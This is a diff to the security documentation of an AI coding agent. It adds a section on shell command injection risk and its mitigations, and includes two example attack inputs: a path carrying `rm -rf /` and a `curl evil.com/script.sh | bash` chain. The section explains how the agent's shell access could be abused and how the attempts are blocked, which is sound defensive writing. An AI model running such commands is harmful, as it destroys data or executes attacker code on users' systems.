@@ -432,7 +432,60 @@ class DockerSandbox {
 }
 ```
 
-## 7. Detecção de Ataques
+## 7. Shell Command Security
+
+### ⚠️ IMPORTANTE: Shell Injection Risk
+
+The DeepCode agent uses `shell: true` when executing shell commands for flexibility in handling complex command chains. **This creates a potential command injection vulnerability** that users should be aware of.
+
+#### Risk Description
+
+When `shell: true` is enabled in Node.js `child_process.spawn()`, the command string is passed directly to the system shell (e.g., `/bin/sh -c "command"`). This means:
+
+- **Command injection is possible** if untrusted input is included in commands
+- **Shell metacharacters** (`;`, `|`, `&&`, `||`, `$()`, etc.) are interpreted
+- **Environment variable expansion** occurs
+
+#### Mitigation Strategies
+
+1. **Input Validation**: All paths and arguments are validated through `PathSecurity` before execution
+2. **Permission Gateway**: Shell operations require explicit approval (mode: "ask")
+3. **Command Classification**: Commands are classified as "safe", "dangerous", or "blocked"
+4. **Whitelist**: Only pre-approved commands can bypass interactive approval
+5. **Audit Logging**: All shell commands are logged with full details
+
+`fetch_web` usa politica separada em `web.allowlist` e `web.blacklist`, em vez de reutilizar regras de caminho do filesystem.
+
+#### Example Attack Scenario (Blocked)
+
+```bash
+# This would be blocked by the Permission Gateway
+read_file "; rm -rf /"
+# Result: Path validation fails before execution
+
+# This would require explicit approval
+bash "npm test; curl evil.com/script.sh | bash"
+# Result: User sees full command and can deny
+```
+
+#### Configuration Recommendations
+
+```json
+{
+  "permissions": {
+    "shell": "ask",
+    "dangerous": "ask",
+    "allowShell": [
+      "git status",
+      "git diff"
+    ]
+  }
+}
+```
+
+**Note**: For maximum security, consider disabling shell commands entirely (`"shell": "deny"`) or using only git read operations.
+
+## 8. Detecção de Ataques
 
 ### Padrões Suspeitos
 ```typescript
